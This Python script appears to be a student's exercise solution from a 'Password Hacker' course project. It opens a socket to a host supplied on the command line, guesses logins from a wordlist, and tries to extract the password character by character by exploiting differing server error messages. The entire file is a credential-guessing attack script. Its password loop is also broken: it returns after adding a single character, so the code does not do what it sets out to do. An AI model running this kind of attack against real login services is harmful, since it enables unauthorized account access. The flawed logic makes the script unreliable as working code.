import json
import socket
import string
import sys

program_name = sys.argv[0]
arguments = sys.argv[1:]

HOST = arguments[0]
PORT = int(arguments[1])
address = (HOST, PORT)


def read_passwords():
    with open('C:/Users/georg/PycharmProjects/Password Hacker/Password Hacker/task/hacking/passwords.txt',
              'r') as psw_file:
        for line in psw_file:
            yield line.strip()


def read_logins():
    with open("C:/Users/georg/PycharmProjects/Password Hacker/Password Hacker/task/hacking/logins.txt",
              "r") as logins_file:
        for login in logins_file:
            yield login.strip()


def send_request_receive_response(login, password):
    login_password = {"login": login, "password": password}
    login_password_json_encode = json.dumps(login_password).encode('utf-8')
    client_socket.send(login_password_json_encode)

    response_json_encode = client_socket.recv(1024)
    response = response_json_encode.decode()
    response = json.loads(response)
    return response["result"]


def is_correct_login():
    logins = read_logins()
    password = " "
    for login in logins:
        response = send_request_receive_response(login, password)
        if response == 'Wrong password!':
            return login


def is_correct_password():
    characters = string.ascii_letters + string.digits
    password = ''
    login = is_correct_login()
    for character in characters:
        response = send_request_receive_response(login, password + character)
        if response == "Exception happened during login":
            password += character
            return password
        if response == "Connection success!":
            return password


def hack():
    login = is_correct_login()
    password = is_correct_password()
    login_and_password = {"login": login, "password": password}
    return json.dumps(login_and_password)


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
    # connecting to the server
    client_socket.connect(address)

    print(hack())
